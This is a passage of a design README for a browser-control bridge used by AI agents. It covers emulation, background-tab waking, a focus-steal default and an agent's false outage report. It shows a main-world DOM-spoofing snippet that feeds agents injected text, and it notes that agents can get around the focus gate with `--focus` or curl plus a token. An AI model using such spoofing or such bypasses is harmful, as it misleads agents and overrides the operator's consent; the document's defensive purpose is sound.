value, but a failure to execute is a clear `frame_not_found` / `frame_eval_failed:<reason>`
error. Own-tab-only + typed-op invariants are unchanged (no raw-CDP passthrough).

## `emulate` — device emulation (0.5.0; create-time hint 0.6.0)

Full operator/agent documentation lives in `reference/emulation.md` (preset metrics
and their provenance, every flag, every error). What follows is the design record.

🔴 **Workflow rule — `emulate` BEFORE you load, not after.** Applying emulation to
a tab that has **already committed a document** leaves that document without
`ontouchstart` and without `TouchEvent` (measured 2026-07-31 on live Brave, ext
0.5.0, `example.com`, `iphone-15`: `"ontouchstart" in window` → `false`,
`typeof TouchEvent` → `undefined`) while `innerWidth`/`devicePixelRatio`,
`navigator.maxTouchPoints` (5), `(pointer:coarse)`, `(hover:none)` and the UA/UA-CH
values are all correct. Those two are installed on the global **at document
creation**, so a live override cannot add them retroactively; everything else the
page queries live. A feature-detecting site then reports "no touch support" and an
agent believes it. The order that works is `browser open <url>` →
`browser emulate <preset>` → **re-`browser nav <url>`** (the document is rebuilt
inside the emulated session) → read/interact.

⚠ It is **not** `browser open` with no URL: that tab sits at `about:blank`, and
`chrome.debugger` attaches only to `http:`/`https:` (`CDP_ATTACHABLE_SCHEMES`), so
`emulate` on it is refused with `cdp_attach_refused:about:` — and an emulated `nav`
cannot rescue it either, since that attaches on the tab's current (`about:blank`)
URL. This README taught the about:blank order until 0.6.0; it never worked.

**Since 0.6.0 the envelope warns you**: `emulate` returns
`documentPredatesEmulation: true` plus an `emulationNote` naming `ontouchstart` /
`TouchEvent` and the re-`nav` remedy, whenever the target tab holds a committed
document that was not built under an emulation with the same create-time signature.
It is silent for the correct re-`nav` sequence, silent on `--reset`, and adds no
field at all to a tab with no emulation state — the same annotation idiom as the
read path's `notEmulatedRead`. See "The `documentPredatesEmulation` hint (0.6.0+)"
in `reference/emulation.md` for the fire/clear table and its limits.

### The central problem: CDP emulation dies at detach

`withCdpSession` **always** detaches in its `finally` — that is invariant #2, and it
is load-bearing (a leaked `chrome.debugger` attachment is a stuck banner plus an
open surface). CDP `Emulation.*` overrides are session-scoped, so they evaporate
with that detach. A naive `emulate` op would therefore set device metrics that were
already gone by the time the next command ran: a confident-wrong-answer bug of
exactly the class this codebase keeps shipping.

**The fix: store, and re-apply inside every session.** `emulate` normalizes the
request into a state object held in a module-level `Map<tabId, state>`
(`emulationState`, `service_worker.js`). `withCdp`'s `run` wrapper — the ONE place
every **CDP** op in the file funnels through — applies the state's ordered step list
before handing control to the op. Apply-then-act, every session.

⚠ **"every CDP op" is not "every op", and the difference is user-visible.**
`text`, `html` and the default `eval` read via `chrome.scripting`, which never
attaches the debugger, so they never reach that choke point and return the tab's
REAL, un-emulated DOM. See "The read path is not emulated" below — that is the
characteristic failure mode of this feature and it has its own annotation.

The choke point is deliberate. Patching `screenshot` and `click` individually would
have fixed the two visible cases and regenerated the bug at the next CDP op anyone
added. One rule, one place.

### `--reset` restores the viewport — and why it took two steps (#319)

This section has been wrong twice. It first claimed that because the overrides die
at detach "the tab is not emulated between ops", so nothing could stick. **Measured
false** (2026-08-03, laptop, extension 0.7.2, with a fresh-tab control):

| step | `innerWidth` |
| --- | --- |
| fresh tab, never emulated (**control** — proves the read path works) | **1124** |
| after `emulate iphone-15` | **393** |
| after `emulate --reset` | **393** ← not restored |
| after `--reset` **and** a re-`nav` | **393** ← still not restored |

That measurement was taken on a build whose reset really did report
`cleared: [Emulation.clearDeviceMetricsOverride, Emulation.setTouchEmulationEnabled,
Emulation.setUserAgentOverride]`, and the size survived them anyway. It is correct,
and it is why PR #320 was closed. It then became the second wrong claim — that the
size *could not* be restored and the mechanism was unknown.

Everything else *does* revert on its own: `devicePixelRatio`, `maxTouchPoints`,
`pointer: coarse`, `prefers-color-scheme`, `userAgent`, `timeZone` — because **a
CDP override dies with the debugger session that set it**, not because anything
cleared it. Only the viewport **size** is sticky. (`"ontouchstart" in window` also
stays true on a document that was *built* emulated — that one is document-creation
residue and a re-`nav` clears it.)

**The mechanism, established 2026-08-04** in a throwaway Brave 147.0.7727.56 under
Xvfb, driven over raw CDP with no extension in the loop, control tab every round:

| what was done | victim `innerWidth` | control |
| --- | --- | --- |
| `setDeviceMetricsOverride{393×852}` in session A, then **detach** | **394** | 1055 |
| `clearDeviceMetricsOverride` in a **fresh** session B | **394** ← no-op | 1055 |
| `setDeviceMetricsOverride{…}` **then** the clear, in session B | **1055** ← restored | 1055 |

🔴 **`clearDeviceMetricsOverride` does nothing when the session sending it never
set an override itself** — and it reports success either way. Every earlier attempt
to undo this sent the clear from a fresh session, so it was a no-op that looked
acknowledged.

**That is also the dpr-vs-width asymmetry** #319 could not explain. One call, two
destinations: dpr/touch/UA/media/timezone are renderer-side session state that dies
at detach; the size additionally resizes the **browser-side render widget**, and
only an explicit clear from an armed session undoes that. Nothing does it at
detach. (Inference from the table, not from Chromium's source.)

**So `--reset` now sends an arm-then-clear pair** in one session
(`EMULATION_RESET_CDP_STEPS`) and reports `restored` + `cleared`. The arming
override is `{width:0,height:0,deviceScaleFactor:0,mobile:false}` — measured not to
resize anything by itself, so there is no flash to a wrong size. It fires
**unconditionally**, even when the worker holds no state for the tab, because an
evicted MV3 worker forgets the state while the tab stays stuck; measured safe on a
never-emulated tab. It is **best-effort**: a refused attach yields
`restored:false` + `restoreError`, never an exception.

**`--reset --recreate` stays**, and is still the right tool twice over — it needs
no CDP, and it is the **only** remedy for a tab the extension cannot reach (an
un-upgraded build, or a tab orphaned by a `SIGKILL`'d agent):

```
browser emulate --reset --recreate
```

which resets, opens a **fresh tab at the same url** owned by the same session,
closes the stuck one, and reports the **new tab id** (it changes — later ops route
to it). It refuses on a non-http(s) url and always opens the replacement *before*
closing the original, so no failure path leaves you with no tab. Plain `--reset`
never swaps tab ids.

⚠ **Not verified against the operator's live Brave.** The fix was measured in a
throwaway instance and pinned by unit tests against a browser model calibrated to
those measurements. The live check is in the PR for #319.

The apply-then-act design is still the right shape — a held-open session would add
a permanent debug banner on top of the same stuck viewport — but it buys strictly
less than this section used to claim.

The other cost, stated plainly: a page that re-measures its *capabilities* after an
op (a `resize` listener reading `devicePixelRatio` or `matchMedia`, a late layout
pass) sees the desktop ones until the next op re-applies. The width it measures
stays the emulated one, because that half is physically stuck on the tab.

### Blast radius: owned tabs only

Enforced server-side via `OWNED_TAB_ONLY_OPS` in `_effective_tab_locked` — the one
place that knows who owns what. The session must own a tab **and** the resolved
target must BE that tab, so an explicit `--tab` cannot reach around ownership onto
one of the operator's tabs. Refusal is `not_owned_tab` (409), distinct from
`no_owned_tab` because the remedies differ.

Every other tab-scoped op degrades to "the active tab" when the session owns
nothing — the useful one-shot read path, and a read is harmless. `emulate` resizes
the viewport, rewrites the UA and turns the mouse into a finger, so the fallback is
removed for it specifically.

### Two ops that had to change, or they would lie

* **`screenshot`'s `captureVisibleTab` fast path is disabled while a tab is
  emulated.** That call never attaches the debugger, so it would have returned a
  valid PNG of the un-emulated desktop layout in answer to "screenshot my iPhone
  viewport" — indistinguishable from a correct result, on the one op whose entire
  job is showing what the device sees. `--fullpage` clips from
  `Page.getLayoutMetrics`, which is read *after* the overrides land, so the clip is
  the emulated one.
* **`click` dispatches `Input.dispatchTouchEvent` under touch emulation**, as
  DevTools does. Chromium synthesizes compatibility mouse events from touch but
  never the reverse, so a `touchstart`-only handler never fires under a mouse
  click — the tap "does nothing" and the agent reports a working page as broken.

`nav` also routes through CDP `Page.navigate` on an emulated tab, so a page
sniffing the UA at load time sees the emulated one rather than being served the
desktop bundle before emulation is ever re-applied.

### The read path is not emulated (and says so)

`text` / `html` / `eval` take the `chrome.scripting` path. Verified by execution:
after `emulate iphone-15` they issue **zero** CDP calls and zero attaches, so no
override is applied to them.

What comes back is a **mixture**: `navigator.userAgent`, `devicePixelRatio`,
`maxTouchPoints` and `matchMedia('(pointer: coarse)')` are the real desktop values
(those overrides died at detach), while `innerWidth` and every
`getBoundingClientRect` are the **emulated** ones, because the widget is physically
that size until a reset clears it. So the read describes a page laid out at the
phone width with desktop capability signals — a document no real device produces,
and a trap: an agent screenshots a phone layout, then reads `text` and reasons
about that hybrid. `js --wake 'devicePixelRatio'` returns the emulated dpr because
it routes `cdpWake` → `withCdp`; bare `js 'devicePixelRatio'` returns the real one.

So a read of a tab **that has emulation state** is annotated, in the same spirit as
`HIDDEN_TAB_NOTE`: `{emulated:false, notEmulatedRead:true, emulationNote}` on the
`chrome.scripting` paths (including `text`/`html --frame`), and
`{emulated:true, emulation:{…}}` on the CDP paths (`--wake` reads, `eval --frame`).
A tab with no emulation state gets neither field, so ordinary envelopes are
unchanged. `viaCdp` is passed per CALL SITE rather than inferred from the op,
because that is genuinely where the answer lives.

### Budget interaction (the #249 bounds)

The re-application runs inside `withCdpSession`'s `run`, so each step goes through
the **wrapped** `send` and is individually bounded by `CDP_COMMAND_TIMEOUT_MS`
(asserted: a hung override reports `cdp_timeout:Emulation.<method>` and still
detaches). The apply plus the op's work stay bounded together by
`CDP_OP_BUDGET_MS`, so the composed worst case is **unchanged** and no term in the
`LOOP_STALL_MS` derivation moves. The step count is bounded by a constant
(`EMULATION_MAX_STEPS` = 6), not by caller input.

⚠ **Unmeasured:** how much of the 15s run budget a real apply consumes on a live
tab. These are loopback `chrome.debugger` calls to a local renderer and are
*expected* to be low-millisecond, but that is an expectation, not a measurement —
there was no browser in the session that built this. If a legitimate op is ever
seen timing out at 18s only when emulated, that is the first number to go measure.

### Exposed to the autonomous agent, DEFAULT-ON (#316)

`emulate` is in `OP_TO_SERVER` and in `ALLOWED_OPS_DEFAULT`, so the `browser agent`
model can call it with no opt-in, with the typed fields
`device`/`width`/`height`/`deviceScaleFactor`/`mobile`/`maxTouchPoints`/
`userAgent`/`timezone`/`orientation`/`colorScheme`/`reset`. `geo` and `touch` are
deliberately **not** forwarded to the agent (location spoofing is unrelated to the
viewport question and is a fingerprinting surface; touch is implied by a preset or
by `maxTouchPoints`).

It was excluded until #316 with the comment in `browser_tool_impl.mjs` saying
emulation "leaves STICKY per-tab state that outlives the op … until an explicit
`emulate --reset` or the tab is replaced", so a crashed agent would hand back a
distorted browser. **That observation was correct** — what was wrong was the
counter-argument this section used to make, that overrides "die at detach" so
nothing can stick. They do not all die at detach: the viewport size survives it,
and survives a re-navigation. Since #319 a *clean* `--reset` does repair it (see
"`--reset` restores the viewport" above); a **crashed** agent still cannot run one.

**The honest argument for shipping it default-on is ownership, not harmlessness:
the `browser-agent` wrapper owns its tab's whole lifecycle.** It `open`s the run's
own tab under the run's own session id and closes it on **every** exit path
(`trap _cleanup_all EXIT INT TERM`, `browser-agent:373`) — and closing is exactly
the remedy for the stuck viewport. Blast radius is additionally bounded
server-side, not by convention: `OWNED_TAB_ONLY_OPS = {"emulate"}` refuses the op
with `not_owned_tab` on any tab the calling session did not `open`. So on the agent
path the sticky residue cannot reach one of the operator's own tabs.

**The residual, stated plainly:** a `SIGKILL` bypasses the trap, and then the run's
tab is orphaned **stuck at the emulated size** with nothing left running that will
issue a reset. A later `browser emulate --reset` against that tab id would repair
it, but nothing does so automatically; `--reset --recreate` or a close is the
practical fix. That is the agent's own tab rather than the operator's, but it is a
real leak and nothing in #316 or #319 removes it.

The other residual is the transient "an extension is debugging this browser" banner
from the CDP attach — which `eval`, `screenshot` and `wake` already raise. Like
those, `emulate` counts as MUTATING for `BROWSER_AGENT_DRY_RUN`, so a dry run never
attaches the debugger.

## `wake` — un-throttling a background tab without stealing the screen

**The measured problem.** A tab created by `open` is background, so
`document.visibilityState === "hidden"` and Chromium throttles it. The historical
remedy documented everywhere was `activate` — which foregrounds the tab and (via
the server's `i3-msg` step) raises the Brave window. Telemetry then caught a Claude
session driving the `work` profile calling `activate` **1–5 times per minute**: the
operator's screen was being yanked away on nearly every interaction.

The reflex was partly **self-inflicted by our own docs**. Every read of a hidden
tab emitted a note ending *"run 'browser activate'"*, and the SKILL.md `open` row
called `activate` "the escape hatch" — so an agent was told to steal focus on every
single hidden read. Those strings are now part of the fix, not just the code.

**What the browser actually does (measured, not assumed).** Run against a throwaway
Brave 1.89 under Xvfb with a real CDP client on a genuinely background tab, using a
rAF-gated fixture (`tests/fixtures/oopif-rig/wake-rig.html`):

| state | rAF/s | timers/s | `visibilityState` |
|---|---|---|---|
| baseline (hidden) | **0** | 8 | hidden |
| + `Page.setWebLifecycleState({state:"active"})` | **0** | — | hidden |
| + `Emulation.setFocusEmulationEnabled({enabled:true})` | **62** | 247 | **visible** |
| after the CDP session **detaches** | **0** | 8 | hidden |

Three findings, all load-bearing:

1. **`Emulation.setFocusEmulationEnabled` is the lever.** It makes the renderer
   report `visible` and produce real animation frames. It is a per-session renderer
   override — it moves no tab focus, no window focus, and nothing the window
   manager can see.
2. **`Page.setWebLifecycleState` alone did nothing** for a merely-hidden tab. It is
   kept as a best-effort first step because it is the only lever for a page
   Chromium has FROZEN (memory-saver lifecycle), which focus emulation does not
   thaw. Its failure never fails the op.
3. **The un-throttled state does NOT survive detach.** It reverted completely the
   instant the session closed. Since every CDP op here is
   attach→run→detach-in-`finally`, a "wake once, read later" op cannot hand a
   *later* read an un-throttled tab. **This is why there are two shapes.**

**The two shapes.**

- **`browser wake`** — attach, un-throttle, hold for a bounded settle (default
  1.5 s, cap 6 s), probe, explicitly un-emulate focus, detach. The un-throttled state ends at detach, but the
  **DOM the page rendered during the window persists** (measured: the fixture's
  rAF-gated content rendered at 472 ms and was still present after detach). This is
  the cheap once-per-tab answer, and the following read stays on the normal
  banner-free path.
- **`--wake` on `text`/`html`/`eval`** — un-throttle and perform *that read* inside
  the same attached session, so the read observes a genuinely un-throttled page.
  Use it when the read must see live un-throttled state (measuring rAF, a lazily
  hydrating SPA) rather than persisted DOM. `--wake=MS` overrides the settle.

**Which WORLD a `--wake` read runs in (this is a security property, not a detail).**
Only the *un-throttle* is CDP. `text --wake` / `html --wake` still perform the READ
through `chrome.scripting` — the **isolated world** — just inside the still-attached
wake session. A CDP `Runtime.evaluate` with no `contextId` would run in the page's
**main world**, where a hostile page can

```js
Object.defineProperty(document.documentElement, 'outerHTML', { get: () => "…attacker text…" })
```

(or shadow `innerText`/`querySelector`/`document.body`) and hand the reader content
it authored that is **not in the DOM** — a prompt-injection payload delivered on
exactly the path agents are told to use when a read "came back empty", and invisible
to later inspection of the real page. The isolated world closes that. The `woke`
verdict is probed the same way, so a page cannot fake `visibilityState` either.

`eval --wake` **does** run in the main world — and that is correct: the default
(non-wake) `eval` is explicitly `world:"MAIN"`, because `eval` means "run my JS with
the page's own globals". `--wake` therefore adds no exposure `eval` didn't already
have. (`eval` cannot use `chrome.scripting` at all: it can only run a serialized
FUNC, never a caller's JS STRING — the #190 null-as-success bug.)

**Focus emulation is turned OFF explicitly, never left to detach.** `wake` sends
`Emulation.setFocusEmulationEnabled({enabled:false})` in a `finally` around the
settle/probe/read, so the emulated-focus window is exactly the wake — on every exit
path, including a throw. Relying on detach to revert it would be relying on an
Emulation-domain implementation detail, and there is a concrete path where detach
does not happen promptly: a hung/failed `chrome.debugger.detach` (tab mid-crash,
wedged renderer) is bounded and **swallowed** by `withCdpSession`'s `safeDetach`, so
the attachment can outlive the op. A tab left permanently focus-emulated is a hidden
tab that believes it is focused and visible — un-throttled indefinitely, stuck debug
banner, nothing that knows to clean it up.

That also keeps a **credential-adjacent** risk from resting on a measured side
effect: `navigator.clipboard.readText()` needs a *focused* document **plus** an
already-granted `clipboard-read` permission, and the operator's clipboard routinely
holds a password or token — so on an origin that already has that grant, a document
that believes it is focused may be able to read it. Bounding the window
deterministically is the fix; hoping the revert happens is not. (Pointer-lock,
fullscreen and autoplay stay closed regardless — they additionally require transient
user activation, which `wake` never synthesizes.)

Relatedly, `withCdp`'s detach now removes the tab from the `cdpAttached` tracking set
**after** the detach resolves, not before: a failed detach must leave the tab
*tracked*, or the leak is invisible to every consumer of that set.

**Why normal reads deliberately stay NON-CDP.** `text`/`html`/`eval` (top frame, no
`--frame`) take the light `chrome.scripting` path with **no debugger attach and no
banner**. Routing every read through CDP so it could un-throttle would make Brave
flash *"an extension is debugging this browser"* on every single read — trading
focus theft for banner spam. So waking is **opt-in**, reached only when a read
actually came back `hidden`. A unit test asserts the default `text`/`html` path
performs **zero** `chrome.debugger` attaches, so a later refactor cannot quietly
regress this.

**Bounds and scope** are the same as every other CDP op: own-tab only, the
pre-attach privileged-scheme refusal (`assertCdpAttachable`), always-detach in a
`finally`, no raw-CDP passthrough (the method set is the frozen `WAKE_CDP_STEPS`
data plus the probe/read), and the settle is clamped so that **settle + one
worst-case CDP command still fits `CDP_OP_BUDGET_MS`**: `WAKE_SETTLE_MAX_MS` is
`CDP_OP_BUDGET_MS - CDP_COMMAND_TIMEOUT_MS - 1s` = **6 s**. An 8 s cap would have let
`html --wake=8000` reach 8 s settle + an 8 s-bounded read = 16 s > the 15 s budget,
surfacing as an opaque `cdp_timeout:op` (it fails safe and still detaches, but tells
the caller nothing). A unit test pins the relationship, so changing a budget without
re-deriving the cap fails CI.

**`wake` does NOT trigger the host-side `i3-msg` foregrounding** — that branch is
keyed on `op == "activate"` alone (a server test enables i3 and asserts a `wake`
spawns nothing). `--frame` is **refused loudly** (`wake_with_frame_unsupported`)
both when combined with `--wake` and on the `wake` op itself — `--frame` is a global
CLI flag, so `browser --frame X wake` would otherwise silently wake the whole tab
while the caller believed they had scoped it. Un-throttling is inherently tab-level;
run `browser wake` on the tab, then re-issue the frame read.

**`activate` stays** — it is still the honest answer when something genuinely needs
the real foreground (a permission prompt, a native picker, verifying with your own
eyes). It just stops being the default advice, and it is absent from the
autonomous agent's op set entirely.

**✅ LIVE-VERIFIED against the operator's real Brave** using the sequence in *Live
verification* below: `WAKE-RIG-SHELL` → `WAKE-RIG-RENDERED`, `visibilityState`
`"visible"` during the wake and back to `"hidden"` after detach, and
`xdotool getactivewindow` **unchanged** before/after — the page rendered and the
operator's focus never moved.

### The focus steal is OPT-IN BY DEFAULT (2026-08-18)

The two mitigations above are a **prose** nudge (reword `HIDDEN_TAB_NOTE` so the
model reaches for `wake`) and an **op-allowlist in one caller** (drop `activate`
from `OP_TO_SERVER`). Re-measuring three weeks later says that combination only
half-held, and says exactly why: the allowlist binds the sandboxed browser-agent
tool and *nothing else*, so Claude Code's Bash tool, an opencode session's bash
tool, and any script still reach `activate` through the ordinary `browser` CLI.

🔴 **What this change IS, and what it is NOT.** It flips the **default** for the
host-side raise from *always* to *only when asked*. That is the whole of it, and it
is worth having: every one of the 166 measured activates came from a caller that
never asked, so the default is what was costing the operator their screen.

It is **not** an authorization boundary, and the README must not be read as
claiming one. Any caller that can reach the bridge can still take the screen:

* the refusal note names the flag (`--focus`) — deliberately, so a caller with a
  real need is not stuck — which means an agent that reads its own error output can
  simply retry with it;
* the `browser` CLI is on `PATH` for every agent that has a shell;
* and `/cmd` is plain loopback HTTP, so `curl` plus the token from
  `~/.config/browser-bridge/token` bypasses the CLI entirely.

The only *structural* barrier remains the sandboxed browser-agent's op allowlist,
which binds that one tool. Everything else here is a well-chosen default. Calling
it "operator-only" or "requires explicit consent" would overstate it into a
security claim it cannot support.

Measured out of `activity.events` (55,003 `source='browser-bridge' kind='cmd'`
rows, **cut-off 2026-07-29 → 08-18**, correlated against `source='i3'
kind='window-focus'` rows for `app='Brave-browser'`). ⚠ The PR body quotes
**108/163 (66.3%)** for `activate`: same population, cut-off extended to 08-19.
Both are right for their window; this table's numbers are the ones used below.

| op | n | focus event within ±1s | in the 1–5s bands |
|---|---|---|---|
| **`activate`** | 166 | **111 (66.9%)** | 5 |
| `screenshot` | 531 | 39 (7.3%) | 45 |
| `nav` | 661 | 34 (5.1%) | 52 |
| `open` | 477 | 17 (3.6%) | 41 |
| `eval` | 3,586 | 106 (3.0%) | 214 |
| `text` | 2,396 | 43 (1.8%) | 103 |
| `wake` | 1,101 | 19 (1.7%) | 52 |

`activate` is the only op whose mass concentrates at ±1s while the 1–5s bands sit
near empty — the shape a WM-driven raise makes, and the shape a human
context-switch does not. Every other op is flat across both bands, i.e. at
background. In particular **`screenshot` does not steal focus**: the leading rival
hypothesis was that `chrome.tabs.captureVisibleTab` structurally needs the
foreground, and it does — which is precisely why the extension only takes that
fast path for a tab that is *already* visible and routes everything else through
CDP.

So the rule moved to the one place the screen is actually taken. `i3_foreground()`
now runs only when the command carries `focus:true` (`focus_requested`, a literal
JSON `true` — never Python truthiness, so a shell-interpolated `"false"` cannot
read as consent). Without it the result reports `i3:"withheld"` plus a note naming
`browser wake` *before* it names `--focus`. The `browser` CLI sends the flag
explicitly on every activate and defaults it to **`[ -t 1 ]`** — a human typing
`browser activate` in a terminal gets today's behaviour unchanged; an agent on a
pipe does not. Over the same window all 166 activates came from non-interactive
callers and 0 of the 9 interactive `browser` commands were an activate, so the
default costs the operator nothing.

Two deployment properties fall out of putting the gate here. The `focus` field is
**popped before dispatch** like `target`/`tab`, so the extension's wire contract is
byte-identical and the fix needs **no extension rebuild and no Brave restart** —
only a `home-manager switch` for `server.py` (the CLI is an `mkOutOfStoreSymlink`
and is live from the working tree). And `payload.focus` is recorded on the activate
telemetry event, so the same query that established the bug can falsify the fix:
after deploy, consented activates should still correlate and withheld ones should
fall toward background.

🔴 **Expect a RESIDUAL, and do not score it as the gate failing.** This change gates
the host-side `i3-msg` raise **only**. The extension also calls
`chrome.windows.update(windowId,{focused:true})` unconditionally
(`extension/service_worker.js:1403`), and nothing here gates that.

**What is ESTABLISHED** (cited, not inferred): `focus_on_window_activation` is
**unset** in `nix/i3/config.nix`, so i3's documented default applies — i3 4.24
userguide §4.30 *Focus on window activation*: "**smart** — This is the default
behavior. If the window requesting focus is on an active workspace, it will receive
the focus. Otherwise, the urgency hint will be set." i3's own example of a window
requesting focus is `google-chrome www.google.com`. (Verified against the i3 actually
running here: `readlink -f $(which i3)` and the userguide quoted above are the **same
store path**, `…-i3-4.24`, so this is the doc for the binary in use, not a version
guess. `grep -rn focus_on_window_activation nix/` returns nothing.) So a request from
Brave **on the visible workspace would be granted focus**, and the older
"Chrome-side focus is a no-op under i3" wording (since corrected in the CLI and
`server.py`) was false as an unconditional claim — it holds only cross-workspace,
which is the usual agent case and exactly why #196 needed `i3-msg`.

**What is NOT established:** whether `chrome.windows.update({focused:true})`
actually emits that X11 activation request. It is the standard mechanism and the
extension's own comment says it "REQUESTS focus", but **nobody has measured it** —
not this PR, not the audit. So the Chrome-side path's contribution is **unknown,
not zero and not proven non-zero**.

Both paths fired together on every pre-fix activate, so the table above cannot
attribute its **111/166 (66.9%)** between them. Therefore, post-deploy:

* **withheld activates should fall TOWARD background, not necessarily TO it**;
* **the baseline to compare against is 66.9% (111/166)**, and background for a
  non-focus-moving op is **~2–7%** (see `wake` 1.7%, `eval` 3.0%, `screenshot`
  7.3% in the table). A withheld residual landing in that band is consistent with
  the gate holding; only a residual **at or near 66.9%** indicates it leaked;
* a residual **between** those — say 15–40% — is the interesting case and means
  the Chrome-side path contributes materially. That is a finding, not a failure.

🔴 **The discriminator, so this is decidable either way.** i3 focus events carry
`payload.workspace`. Split withheld activates by whether Brave was **already on the
visible workspace** at the time:

* residual concentrated in the **same-workspace** subset → the Chrome-side path is
  real, `smart` granted it, and the gate is working as designed;
* residual spread across **both** subsets → something is still calling `i3-msg`,
  i.e. the gate genuinely leaked.

That split does not depend on knowing the answer in advance, which is why it is the
check to run rather than either claim above.

🔴 **And treat an absent `focus` field as UNKNOWN, never as pre-deploy.** Throttled
(HTTP 429) activates return from their own branch *before* the `payload.focus`
augmentation runs, so a row can legitimately carry no `focus` key on the new server.
A falsification query that buckets "no focus field" as "old server" will silently
mix throttled new-server rows into the pre-deploy bucket. Bucket it as UNKNOWN and
report its count separately.

**Trade-off, stated plainly:** a script or an agent that genuinely wanted the
foreground now has to ask for it, and will silently not get it until someone reads
the `withheld` note and adds `--focus`. That is the intended direction — a caller
that wanted the screen can re-run, whereas a caller that did not want it cannot
un-interrupt the operator — but it *is* a behaviour change for every existing
non-interactive `browser activate` caller.

🔴 **VERIFICATION STATUS OF THIS SECTION — read it against the ✅ badge above, which
is NOT about `activate`.** That badge covers the **`wake`** rig (`open` → `text` →
`wake` → `text`); its cited sequence contains no `activate` call at all. For the
consent gate:

* **`browser activate --focus` has never been run against a real i3 — by anyone.**
  Not in this PR (no live reproduction was performed: reproducing the bug means
  taking the operator's screen), and not in #557, whose own commit message says
  nothing was checked against a live i3 either. **The escape hatch is the
  unverified surface.**
* The **withheld** path is the half that *was* observed, and it is unverified in a
  much weaker sense: it never enters `i3_foreground` at all, so there is no i3
  interaction to get wrong. That is asserted on the fake's call log
  (`test_refused_activate_makes_no_i3_round_trip_at_all`), not inferred.
* Everything else rests on 55,003 telemetry rows plus the code path — see the table
  above — and on the suite, not on a live run.

So: the path this change **closes** is well evidenced; the path it **leaves open for
a human who types `--focus`** is the one nobody has watched work end to end.

### Real false-outage report — a hidden tab that looked like a production outage

This is the cost of the failure mode `wake` exists to prevent, and the reason the
`visibilityState` rule in SKILL.md is 🔴. It happened.

An agent read `civitai.com/apps` in a BACKGROUND tab it owned and saw 0 content
cards, 3 spinners, and 0 tRPC calls — for a logged-in user with every feature flag
on. It declared the production store broken, then escalated to **"site-wide"** when
a second page looked the same.

Every corroborating check it ran shared the identical flaw:

- **A second profile on a different account reproduced it exactly** — also a
  background tab. Two independent-looking confirmations, one shared cause.
- **`?cb=<ts>` cache-busting didn't help** — the tab was still hidden, so the fresh
  load was throttled the same way.
- **A `next.router.push` soft-nav inside the hidden tab threw a plausible
  `TypeError` plus a minified React error** — errors **the probe itself caused**.
  Real-user telemetry showed **zero** occurrences of them in the preceding 2 hours.

Nothing inside the browser could settle it, because every reading came from the same
poisoned vantage point. It was settled only by **leaving the browser**: RUM showed
~24k content-paint samples in 30 minutes, pods were healthy, and an anonymous `curl`
returned 200. The site was fine the entire time.

**The remedy, updated.** The original write-up of this incident concluded that
`activate` was the only fix, because at the time it was — foregrounding the tab was
the only way to un-throttle it. **That is no longer true.** `browser wake` (#225)
un-throttles the tab via CDP focus emulation **without moving the operator's focus**,
so the diagnostic step no longer costs the operator their screen. `activate` remains
only for things that genuinely need the real foreground (a permission prompt, a
native picker, seeing it with your own eyes), and is unreachable by the autonomous
agent. See *The two shapes* above for `wake` vs `--wake`.

**The three rules this bought** (carried in SKILL.md, in the `wake` section):

1. Check `document.visibilityState` FIRST. If `"hidden"`, a "nothing rendered / no
   requests fired" reading is MEANINGLESS.
2. Spoofing `visibilityState` afterwards does NOT recover the page — the throttling
   is browser-enforced and the app's fetch decisions are already made. `wake` is the
   fix.
3. **"Is this page broken for REAL users?" is not a browser question.** Answer it
   from server-side / real-user evidence — RUM, metrics, pod health, an anonymous
   `curl`. Use the browser probe to EXPLAIN a failure telemetry already shows, never
   to DISCOVER one.

### Live verification (operator-run)

Is the new build even loaded? `wake` is a **NEW op name**, which makes it a
deterministic build tell:

```bash
browser --instance <key> wake      # OLD extension → `unknown_op` + the reload/restart
                                   # message; NEW extension → a JSON wake result
```

Then prove the fix — it must show BOTH that a hidden tab renders AND that focus
does not move:

```bash
export DISPLAY=:0 XAUTHORITY=/home/zach/.Xauthority
python3 -m http.server 8901 --bind 127.0.0.1 \
  --directory ~/workspace/devrc/scripts/browser-bridge/tests/fixtures/oopif-rig &

nix-shell -p xdotool --run 'xdotool getactivewindow getwindowname'   # BEFORE

browser open http://127.0.0.1:8901/wake-rig.html
browser text            # expect: WAKE-RIG-SHELL, hidden:true, the wake note
browser wake            # expect: woke:true, visibilityState:"visible"
browser text            # expect: WAKE-RIG-RENDERED  (the DOM survived detach)

nix-shell -p xdotool --run 'xdotool getactivewindow getwindowname'   # AFTER — MUST MATCH
browser close
```

`wake-rig.html` only swaps in its `WAKE-RIG-RENDERED` sentinel after 30 real
animation frames, and a hidden tab gets none — so the shell→sentinel transition is
a genuine un-throttle, not a page that would have rendered anyway (the OOPIF rig
pages render fine while hidden and cannot demonstrate this). A run that renders the
page but changes the active window name is a **failure**, not a pass.

Optional third check — the read world (`wake-shadow.html` installs a main-world
`outerHTML` getter and shadows `innerText`/`querySelector`):

```bash
browser open http://127.0.0.1:8901/wake-shadow.html
browser html --wake     # MUST be the FULL document containing WAKE-SHADOW-REAL —
                        # NOT the short `<html>WAKE-SHADOW-POISON-MAIN-WORLD</html>`
browser text --wake     # MUST be exactly WAKE-SHADOW-REAL
browser js 'document.documentElement.outerHTML' --wake   # WILL show the POISON — expected
browser close
```

Strictly speaking this is belt-and-braces: `text`/`html --wake` use the *same
mechanism* as an ordinary read (`chrome.scripting`), so their world is the one
already exercised everywhere. The fixture exists so the property is checkable rather
than argued.

**CDP ops (`chrome.debugger`) — `screenshot` + TOP-frame trusted input.** These use the
Chrome DevTools Protocol via the `debugger` permission. They fix two real agent
failures: (1) `captureVisibleTab` could only grab the foreground tab (can't screenshot
a background tab or two profiles); (2) there was no trusted-input primitive to drive an
app's top frame.

**Design — per-op attach → run → always-detach.** The extension attaches
`chrome.debugger` for the single op, runs a FIXED set of CDP methods, and detaches
in a `finally` (so a thrown op still detaches). This keeps the "an extension is
debugging this browser" banner window tiny and prevents a leaked attachment.
`chrome.debugger.onDetach` clears an out-of-band detach (tab crash/close, banner
Cancel). All decision logic (attach-scope validation, the always-detach
orchestration `withCdpSession`, frame enumeration/resolution, the key/coordinate
math, the frame read-expression builders) is **pure + unit-tested** in
`extension/protocol.js` (`../tests/cdp_protocol.test.mjs`); `service_worker.js` is
only the thin `chrome.debugger` side-effect glue.

**Security model — the `debugger` permission is the biggest blast radius, so:**

1. **STRICT own-tab attach scope.** The server tab-scopes a CDP op and routes it
   ONLY to the caller's owned/`--tab` tab; the extension attaches `chrome.debugger`
   ONLY to that injected tab and **refuses to attach to a privileged surface**
